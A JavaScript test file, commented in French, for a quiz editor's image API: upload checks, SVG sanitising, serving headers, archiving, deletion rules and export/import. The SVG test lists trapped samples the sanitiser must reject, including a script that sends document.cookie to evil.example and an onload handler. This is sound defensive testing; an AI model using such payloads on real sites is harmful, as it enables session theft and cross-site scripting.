// Tests de l'API des images (jalon 7b, décisions D56, D57, D59) : téléversement (type vérifié sur les
// octets, doublon non stocké, SVG assaini ou refusé), service public /images/<id> avec ses en-têtes,
// liste avec les utilisations, archivage, suppression refusée si utilisée, export et import avec les
// images envoyées à part.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { serveurDeTest } from './aide-serveur.js';
import { IMPORT_WORD } from '../worker/editeur.js';
import { MAX_IMAGE_BYTES, cleanImageName, decodeBase64, encodeBase64, imageIdFor, imageUsages, isImageId, magicType, usagesText } from '../worker/images.js';

const M10 = 'm10-tournage-vc';
const ALESOIR = readFileSync(new URL('../site/img/outils/alesoir.png', import.meta.url));
const base64 = (bytes) => Buffer.from(bytes).toString('base64');

async function editeurDeTest() {
  const serveur = serveurDeTest();
  const { status, corps } = await serveur.appel('POST', '/api/prof/connexion', { corps: { cle: 'cle-admin-de-test' } });
  assert.equal(status, 200, JSON.stringify(corps));
  const entetes = { cookie: `prof=${serveur.derniersEntetes.get('set-cookie').match(/^prof=([^;]+)/)[1]}` };
  serveur.editeur = (methode, chemin, corps) => serveur.appel(methode, `/api/prof/editeur/${chemin}`, { corps, entetes });
  // Une image servie : { status, headers, bytes } — la réponse n'est pas du JSON.
  serveur.image = async (id, headers = {}) => {
    const response = await (await import('../worker/index.js')).handle(new Request(`https://quiz.example/images/${id}`, { headers }), serveur.env, { now: serveur.maintenant, random: serveur.random, randomBytes: (n) => serveur.randomBytes(n) });
    return { status: response.status, headers: response.headers, bytes: response.status === 200 ? new Uint8Array(await response.arrayBuffer()) : null };
  };
  return serveur;
}

// Une photo PNG distincte de toutes celles de la semence : la photo de l'alésoir avec un octet de plus à la fin.
const photoNeuve = () => Buffer.concat([ALESOIR, Buffer.from([0x2a])]);

test('règles pures : identifiants, nom lisible, type d’après les octets, base64, utilisations', async () => {
  assert.deepEqual(['mvlnr', 'percage', 'img-0123456789abcdef', 'alesage_a_l_alesoir'].map(isImageId), [true, true, true, true]);
  assert.deepEqual(['', 'Mvlnr', '../x', 'a b', 'a/b', '-a', 'a-', 'a'.repeat(81)].map(isImageId), [false, false, false, false, false, false, false, false]);
  assert.equal(imageIdFor('abcdef0123456789ffff'), 'img-abcdef0123456789');
  assert.deepEqual(['Fraise en bout.PNG', ' photo:outil/2 .jpeg', '', 'sans-extension', 'a.b.c.svg'].map(cleanImageName), ['Fraise en bout', 'photo outil 2', 'image', 'sans-extension', 'a.b.c']);
  assert.equal(magicType(ALESOIR), 'image/png');
  assert.equal(magicType(new Uint8Array([0xff, 0xd8, 0xff, 0xe0])), 'image/jpeg');
  assert.equal(magicType(new Uint8Array([0x52, 0x49, 0x46, 0x46, 0, 0, 0, 0, 0x57, 0x45, 0x42, 0x50])), 'image/webp');
  assert.equal(magicType(new Uint8Array([0x3c, 0x73, 0x76, 0x67])), null); // « <svg » : pas une image binaire
  const bytes = new Uint8Array([0, 1, 2, 250, 255]);
  assert.deepEqual([...decodeBase64(encodeBase64(bytes))], [...bytes]);
  assert.equal(decodeBase64('pas du base64!'), null);
  assert.equal(decodeBase64('abc'), null);
  const usages = imageUsages('mvlnr', {
    versions: [{ exercice_id: M10, numero: 1, contenu: { outils: [{ id: 'mvlnr', image: 'mvlnr' }] } }, { exercice_id: M10, numero: 2, contenu: { outils: [{ id: 'mvlnr_2', image: 'autre' }] } }],
    exercices: [{ id: M10, brouillon: { outils: [{ image: 'mvlnr' }] } }, { id: 'x', brouillon: { outils: [] } }],
    banque: [{ id: 'mvlnr', outil: { image: 'mvlnr' } }, { id: 'mvlnr_2', outil: { image: 'mvlnr' } }],
    tables: [{ id: 'A2026_r0', operations: { operations: [{ operation: 'Perçage' }] } }],
  });
  assert.deepEqual(usages, { versions: [`${M10} v1`], brouillons: [M10], banque: ['mvlnr', 'mvlnr_2'], tables: [] });
  assert.equal(usagesText(usages), `version publiée ${M10} v1 · brouillon ${M10} · banque mvlnr, mvlnr_2`);
  assert.deepEqual(imageUsages('percage', { tables: [{ id: 'A2026_r0', operations: { operations: [{ operation: 'Perçage' }] } }, { id: 'B', operations: { operations: [{ operation: 'Perçage', pictogramme: 'img-abc' }] } }] }).tables, ['A2026_r0']);
  // Les images d'une classe ISO (D64) : une version d'avant (sans classes_iso) nomme celles de la semence ; une version qui a retiré l'image ne la nomme plus.
  const tables = [
    { id: 'A2026_r0', materiaux: {}, operations: { operations: [] } },
    { id: 'B', materiaux: { classes_iso: [{ code: 'P', image_chaleur: 'img-abc' }] }, operations: { operations: [] } },
  ];
  assert.deepEqual(imageUsages('copeaux-p-chaleur', { tables }).tables, ['A2026_r0']);
  assert.deepEqual(imageUsages('img-abc', { tables }).tables, ['B']);
  assert.deepEqual(imageUsages('copeaux-m-chaleur', { tables }).tables, ['A2026_r0']); // B n'a que la classe P
});

test('GET /images/<id> : public, sans cookie ; type exact, nosniff, cache d’un an, ETag et 304 ; SVG avec une politique sans script ; inconnu → 404', async () => {
  const serveur = await editeurDeTest();
  const photo = await serveur.image('mvlnr');
  assert.equal(photo.status, 200);
  assert.equal(photo.headers.get('content-type'), 'image/png');
  assert.equal(photo.headers.get('cache-control'), 'public, max-age=31536000, immutable');
  assert.equal(photo.headers.get('x-content-type-options'), 'nosniff');
  assert.equal(photo.headers.get('content-security-policy'), null);
  assert.equal(Buffer.compare(Buffer.from(photo.bytes), readFileSync(new URL('../site/img/outils/mvlnr.png', import.meta.url))), 0);
  assert.equal((await serveur.image('mvlnr', { 'if-none-match': photo.headers.get('etag') })).status, 304);
  const picto = await serveur.image('percage');
  assert.equal(picto.headers.get('content-type'), 'image/svg+xml; charset=utf-8');
  assert.equal(picto.headers.get('content-security-policy'), "default-src 'none'; style-src 'unsafe-inline'; sandbox");
  assert.match(Buffer.from(picto.bytes).toString('utf8'), /^<svg xmlns="http:\/\/www\.w3\.org\/2000\/svg" viewBox=/);
  assert.equal((await serveur.image('inconnue')).status, 404);
  assert.equal((await serveur.image('..%2Fx')).status, 404);
  assert.equal((await serveur.image('MVLNR')).status, 404);
});

test('téléverser : type vérifié sur les octets, doublon non stocké (l’image existante est rendue), image trop grande ou illisible refusée ; journalisé', async () => {
  const serveur = await editeurDeTest();
  const depart = serveur.journalEnseignant().length;
  // La photo de l'alésoir, déjà en base par la semence : rien de stocké, l'existante est rendue.
  const doublon = await serveur.editeur('POST', 'images/televerser', { nom: 'alesoir-photo.png', usage: 'outil', type: 'image/png', contenu: base64(ALESOIR) });
  assert.equal(doublon.status, 200, JSON.stringify(doublon.corps));
  assert.deepEqual([doublon.corps.existante, doublon.corps.image.id, doublon.corps.image.nom], [true, 'alesoir', 'Alésoir']);
  assert.equal(serveur.db.sqlite.prepare('SELECT COUNT(*) AS n FROM images').get().n, 54);
  // Une photo neuve : stockée sous un identifiant tiré de son empreinte, nommée d'après le fichier.
  const neuve = await serveur.editeur('POST', 'images/televerser', { nom: 'Fraise à rainurer.png', usage: 'outil', type: 'image/png', contenu: base64(photoNeuve()) });
  assert.equal(neuve.status, 200, JSON.stringify(neuve.corps));
  const { image } = neuve.corps;
  assert.equal(neuve.corps.existante, false);
  assert.match(image.id, /^img-[0-9a-f]{16}$/);
  assert.deepEqual([image.nom, image.usage, image.type, image.taille, image.archivee_le, image.creee_le], ['Fraise à rainurer', 'outil', 'image/png', ALESOIR.length + 1, null, '2026-09-21T13:05:00.000Z']);
  assert.equal(image.id, `img-${image.empreinte.slice(0, 16)}`);
  const servie = await serveur.image(image.id);
  assert.equal(servie.status, 200);
  assert.equal(Buffer.compare(Buffer.from(servie.bytes), photoNeuve()), 0);
  // Le même contenu encore, sous un autre nom : l'existante, pas de seconde ligne.
  const encore = await serveur.editeur('POST', 'images/televerser', { nom: 'autre nom.png', usage: 'operation', type: 'image/png', contenu: base64(photoNeuve()) });
  assert.deepEqual([encore.corps.existante, encore.corps.image.id], [true, image.id]);
  assert.equal(serveur.db.sqlite.prepare('SELECT COUNT(*) AS n FROM images').get().n, 55);
  // Refus : type annoncé qui ne correspond pas aux octets, fichier qui n'est pas une image, usage ou type inconnu, contenu absent, trop grand.
  const mauvaisType = await serveur.editeur('POST', 'images/televerser', { nom: 'x.jpg', usage: 'outil', type: 'image/jpeg', contenu: base64(ALESOIR) });
  assert.deepEqual([mauvaisType.status, mauvaisType.corps.erreur], [400, 'Le fichier est en image/png, pas en image/jpeg.']);
  assert.match((await serveur.editeur('POST', 'images/televerser', { nom: 'x.png', usage: 'outil', type: 'image/png', contenu: base64(Buffer.from('pas une image du tout')) })).corps.erreur, /premiers octets/);
  assert.match((await serveur.editeur('POST', 'images/televerser', { nom: 'x.png', usage: 'photo', type: 'image/png', contenu: base64(ALESOIR) })).corps.erreur, /« usage »/);
  assert.match((await serveur.editeur('POST', 'images/televerser', { nom: 'x.gif', usage: 'outil', type: 'image/gif', contenu: base64(ALESOIR) })).corps.erreur, /Type d'image inconnu/);
  assert.match((await serveur.editeur('POST', 'images/televerser', { nom: 'x.png', usage: 'outil', type: 'image/png', contenu: '' })).corps.erreur, /absent ou illisible/);
  const grosse = Buffer.concat([ALESOIR, Buffer.alloc(MAX_IMAGE_BYTES)]);
  assert.match((await serveur.editeur('POST', 'images/televerser', { nom: 'x.png', usage: 'outil', type: 'image/png', contenu: base64(grosse) })).corps.erreur, /au plus 600 Ko/);
  assert.equal(serveur.db.sqlite.prepare('SELECT COUNT(*) AS n FROM images').get().n, 55);
  const actions = serveur.journalEnseignant().slice(depart);
  assert.deepEqual(actions.map((l) => l.action), ['editeur_image_televersement']);
  assert.equal(actions[0].details, `${image.id} · Fraise à rainurer · outil · image/png · ${ALESOIR.length + 1} octets`);
});

test('téléverser un SVG : assaini (ce qui est retiré est dit) et servi avec sa politique ; un SVG piégé est refusé, rien n’est stocké', async () => {
  const serveur = await editeurDeTest();
  const svg = '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:inkscape="x" viewBox="0 0 10 10"><metadata>m</metadata><path d="M0 0L10 10" inkscape:label="l" stroke="#000"/></svg>';
  const ok = await serveur.editeur('POST', 'images/televerser', { nom: 'lamage.svg', usage: 'operation', type: 'image/svg+xml', contenu: base64(Buffer.from(svg, 'utf8')) });
  assert.equal(ok.status, 200, JSON.stringify(ok.corps));
  assert.deepEqual(ok.corps.retires, ['attribut xmlns:inkscape sur <svg>', 'élément <metadata>', 'attribut inkscape:label sur <path>']);
  assert.deepEqual([ok.corps.image.type, ok.corps.image.usage, ok.corps.image.nom], ['image/svg+xml', 'operation', 'lamage']);
  const servie = await serveur.image(ok.corps.image.id);
  assert.equal(Buffer.from(servie.bytes).toString('utf8'), '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><path d="M0 0L10 10" stroke="#000"/></svg>');
  assert.equal(servie.headers.get('content-type'), 'image/svg+xml; charset=utf-8');
  assert.equal(servie.headers.get('content-security-policy'), "default-src 'none'; style-src 'unsafe-inline'; sandbox");
  assert.equal(servie.headers.get('x-content-type-options'), 'nosniff');
  // Piégé : script, gestionnaire d'événement, lien externe → 400, rien de stocké.
  const avant = serveur.db.sqlite.prepare('SELECT COUNT(*) AS n FROM images').get().n;
  for (const [piege, motif] of [
    ['<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><script>fetch("https://evil.example/?"+document.cookie)</script></svg>', /élément <script>/],
    ['<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1" onload="alert(1)"><rect width="1" height="1"/></svg>', /gestionnaire d'événement « onload »/],
    ['<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><a href="https://evil.example"><rect width="1" height="1"/></a></svg>', /élément <a>/],
    ['<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><image href="https://evil.example/pixel.png"/></svg>', /élément <image>/],
    ['<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><rect width="1" height="1" fill="url(https://evil.example/f.svg#g)"/></svg>', /ressource externe/],
    ['pas du svg', /un seul élément racine/],
  ]) {
    const refus = await serveur.editeur('POST', 'images/televerser', { nom: 'piege.svg', usage: 'operation', type: 'image/svg+xml', contenu: base64(Buffer.from(piege, 'utf8')) });
    assert.equal(refus.status, 400, piege);
    assert.match(refus.corps.erreur, motif);
  }
  assert.equal(serveur.db.sqlite.prepare('SELECT COUNT(*) AS n FROM images').get().n, avant);
  // Un PNG annoncé comme SVG : refusé (pas du XML).
  assert.equal((await serveur.editeur('POST', 'images/televerser', { nom: 'x.svg', usage: 'operation', type: 'image/svg+xml', contenu: base64(ALESOIR) })).status, 400);
});

test('liste avec les utilisations ; archiver (toujours servie, retirée du choix) ; renommer ; supprimer refusé si utilisée (409), permis sinon', async () => {
  const serveur = await editeurDeTest();
  const { status, corps } = await serveur.editeur('GET', 'images');
  assert.equal(status, 200);
  assert.equal(corps.images.length, 54);
  const mvlnr = corps.images.find((i) => i.id === 'mvlnr');
  assert.deepEqual(mvlnr.utilisations, { versions: [`${M10} v1`], brouillons: [M10], banque: ['mvlnr'], tables: [] });
  assert.deepEqual(corps.images.find((i) => i.id === 'percage').utilisations, { versions: [], brouillons: [], banque: [], tables: ['A2026_r0'] });
  assert.deepEqual(corps.images.find((i) => i.id === 'fraise_a_surfacer').utilisations, { versions: [], brouillons: [], banque: ['fraise_a_surfacer'], tables: [] });
  assert.deepEqual((await serveur.editeur('GET', 'images?usage=operation')).corps.images.map((i) => i.usage).filter((u) => u !== 'operation'), []);
  assert.equal((await serveur.editeur('GET', 'images?usage=outil')).corps.images.length, 29);

  // Supprimer une image utilisée par une version publiée : refusé, et le message dit où.
  const refus = await serveur.editeur('POST', 'images/supprimer', { id: 'mvlnr' });
  assert.equal(refus.status, 409);
  assert.equal(refus.corps.erreur, `Cette image est utilisée (version publiée ${M10} v1 · brouillon ${M10} · banque mvlnr) : elle ne peut pas être supprimée, seulement archivée.`);
  assert.equal((await serveur.editeur('POST', 'images/supprimer', { id: 'fraise_a_surfacer' })).status, 409); // utilisée par la banque seulement : refusé aussi
  // Archiver : retirée du choix, toujours servie.
  assert.deepEqual((await serveur.editeur('POST', 'images/archiver', { id: 'mvlnr', archive: true })).corps, { archive: true, id: 'mvlnr' });
  assert.notEqual((await serveur.editeur('GET', 'images')).corps.images.find((i) => i.id === 'mvlnr').archivee_le, null);
  assert.equal((await serveur.image('mvlnr')).status, 200);
  assert.equal((await serveur.editeur('POST', 'images/archiver', { id: 'mvlnr', archive: false })).corps.archive, false);
  assert.equal((await serveur.editeur('POST', 'images/archiver', { id: 'mvlnr', archive: 'oui' })).status, 400);
  assert.equal((await serveur.editeur('POST', 'images/archiver', { id: 'inconnue', archive: true })).status, 404);
  // Renommer : le nom lisible seulement.
  assert.deepEqual((await serveur.editeur('POST', 'images/renommer', { id: 'mvlnr', nom: '  MVLNR (photo du classeur) ' })).corps, { renomme: true, id: 'mvlnr', nom: 'MVLNR (photo du classeur)' });
  assert.equal((await serveur.editeur('GET', 'images')).corps.images.find((i) => i.id === 'mvlnr').nom, 'MVLNR (photo du classeur)');
  assert.equal((await serveur.editeur('POST', 'images/renommer', { id: 'mvlnr', nom: ' ' })).status, 400);
  // Une image jamais utilisée se supprime ; ensuite, 404.
  const neuve = (await serveur.editeur('POST', 'images/televerser', { nom: 'essai.png', usage: 'outil', type: 'image/png', contenu: base64(photoNeuve()) })).corps.image;
  assert.deepEqual((await serveur.editeur('GET', 'images')).corps.images.find((i) => i.id === neuve.id).utilisations, { versions: [], brouillons: [], banque: [], tables: [] });
  assert.deepEqual((await serveur.editeur('POST', 'images/supprimer', { id: neuve.id })).corps, { supprimee: true, id: neuve.id });
  assert.equal((await serveur.image(neuve.id)).status, 404);
  assert.equal((await serveur.editeur('POST', 'images/supprimer', { id: neuve.id })).status, 404);
  const actions = serveur.journalEnseignant().filter((l) => l.action.startsWith('editeur_image')).map((l) => l.action);
  assert.deepEqual(actions, ['editeur_image_archivage', 'editeur_image_retablissement', 'editeur_image_renommage', 'editeur_image_televersement', 'editeur_image_suppression']);
});

test('export et import (D59) : les images sont dans l’export (base64) ; l’import reçoit les fiches, réclame le contenu des images manquantes une par une, puis fusionne ; l’aller-retour est identique', async () => {
  const source = await editeurDeTest();
  const neuve = (await source.editeur('POST', 'images/televerser', { nom: 'photo neuve.png', usage: 'outil', type: 'image/png', contenu: base64(photoNeuve()) })).corps.image;
  assert.equal((await source.editeur('POST', 'images/archiver', { id: 'alesoir_2', archive: true })).status, 200);
  const { status, corps: exporte } = await source.editeur('GET', 'export');
  assert.equal(status, 200);
  assert.equal(exporte.images.length, 55);
  const exportee = exporte.images.find((i) => i.id === neuve.id);
  assert.deepEqual(Object.keys(exportee).sort(), ['archivee_le', 'contenu', 'creee_le', 'empreinte', 'id', 'nom', 'taille', 'type', 'usage']);
  assert.equal(Buffer.compare(Buffer.from(exportee.contenu, 'base64'), photoNeuve()), 0);
  assert.notEqual(exporte.images.find((i) => i.id === 'alesoir_2').archivee_le, null);
  assert.match(source.journalEnseignant().at(-1).details, /55 image\(s\)$/);

  // Sur une base neuve : l'export sans le contenu des images (c'est ce que le navigateur envoie).
  const cible = await editeurDeTest();
  const fiches = { ...exporte, images: exporte.images.map(({ contenu, ...fiche }) => fiche) };
  const validation = await cible.editeur('POST', 'import/valider', { export: fiches });
  assert.deepEqual(validation.corps.erreurs, []);
  assert.deepEqual([validation.corps.resume.images_manquantes, validation.corps.resume.images_presentes, validation.corps.resume.images_modifiees], [[neuve.id], 54, ['alesoir_2']]);
  const tropTot = await cible.editeur('POST', 'import', { export: fiches, confirmation: IMPORT_WORD });
  assert.equal(tropTot.status, 400);
  assert.deepEqual(tropTot.corps.images_manquantes, [neuve.id]);
  // Chaque image manquante est envoyée à part, avec son contenu ; une empreinte qui ne correspond pas est refusée.
  assert.match((await cible.editeur('POST', 'images/importer', { image: { ...exportee, empreinte: 'f'.repeat(64) } })).corps.erreur, /pas l'empreinte annoncée/);
  assert.deepEqual((await cible.editeur('POST', 'images/importer', { image: exportee })).corps, { importee: true, id: neuve.id, existante: false });
  assert.deepEqual((await cible.editeur('POST', 'images/importer', { image: exportee })).corps, { importee: false, id: neuve.id, existante: true }); // déjà là : rien à faire
  assert.deepEqual((await cible.editeur('POST', 'import/valider', { export: fiches })).corps.resume.images_manquantes, []);
  const importe = await cible.editeur('POST', 'import', { export: fiches, confirmation: IMPORT_WORD });
  assert.equal(importe.status, 200, JSON.stringify(importe.corps));
  const { corps: apres } = await cible.editeur('GET', 'export');
  const sansDates = ({ exporte_le, ...rest }) => rest;
  assert.deepEqual(sansDates(apres), sansDates(exporte)); // aller-retour identique, images comprises (contenu, nom, archivage, dates)
  assert.equal((await cible.image(neuve.id)).status, 200);
  // Une image de l'export dont la base a une autre sous le même identifiant : refusée (immuable).
  const autre = { ...exportee, id: 'mvlnr' };
  assert.equal((await cible.editeur('POST', 'images/importer', { image: autre })).status, 409);
  const conflit = await cible.editeur('POST', 'import/valider', { export: { ...fiches, images: [{ ...fiches.images.find((i) => i.id === 'mvlnr'), empreinte: 'e'.repeat(64) }] } });
  assert.match(conflit.corps.erreurs[0], /« mvlnr » : la base en a une autre/);
  // Un export d'avant les images (sans « images ») s'importe encore.
  const { images, ...ancien } = fiches;
  assert.deepEqual((await cible.editeur('POST', 'import/valider', { export: ancien })).corps.erreurs, []);
  assert.equal((await cible.editeur('POST', 'import', { export: ancien, confirmation: IMPORT_WORD })).status, 200);
});
